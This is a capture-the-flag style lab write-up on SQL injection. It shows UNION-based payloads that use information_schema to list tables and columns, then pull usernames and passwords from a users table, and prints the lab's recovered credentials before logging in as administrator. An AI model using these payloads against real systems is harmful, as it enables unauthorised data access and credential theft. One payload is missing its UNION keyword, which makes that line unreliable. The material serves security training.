## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234173772-d674eb97-c3c0-4f6d-99b2-3628123f4f5b.png)

## Solution :

Most database types (with the notable exception of Oracle) have a set of views called the `information schema` which provide information about the database.

You can query `information_schema.tables` to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```
O/P shows the columns present in it

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

## Steps

![image](https://user-images.githubusercontent.com/67383098/234173842-080419e3-bb62-4507-b6c2-4d30888d4ce8.png)


#### Determine te number of columns -

**ORDER BY 3**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3--
```

![image](https://user-images.githubusercontent.com/67383098/234173744-116b627a-2c8d-4651-bc3c-7ed6140df288.png)

#### Determine wich column contains text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' SELECT 'abc','def'--
```
Both the columns contain text data.

![image](https://user-images.githubusercontent.com/67383098/234236358-f0e2e77a-08de-4d4a-99a3-782ffa80f5ae.png)

### List the database contents

#### List tables -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM information_schema.tables--
```

We get list of all the available tables

![image](https://user-images.githubusercontent.com/67383098/234243537-2f93b162-2198-4cb0-b252-33830667abef.png)

![image](https://user-images.githubusercontent.com/67383098/234248758-0f64078c-cf1c-495b-a685-e4627826101b.png)


#### List columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_fhlhke'--
```

We get these columns

![image](https://user-images.githubusercontent.com/67383098/234249287-a2b9687b-5454-43b2-950a-081b9d233dea.png)

columns - `username_yoqrkg` & `password_btqiad`

#### Retreive information from the columns username_yoqrkg & password_btqiad from the table users_fhlhke -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username_yoqrkg,password_btqiad FROM users_fhlhke--
```
Now we get the username and password of all users.

![image](https://user-images.githubusercontent.com/67383098/234250737-85288dcd-13a8-406b-82c7-1198ab231fb6.png)

carlos - `hfs0tq3xzvdz2awja6bn`
wiener - 7qsyjg4sbbxt16easf7l``
administrator - `a80zs35scefit206tw5s`

Now login as administrator,

![image](https://user-images.githubusercontent.com/67383098/234251558-ea8c0529-f717-43eb-8a66-507fc790501a.png)

















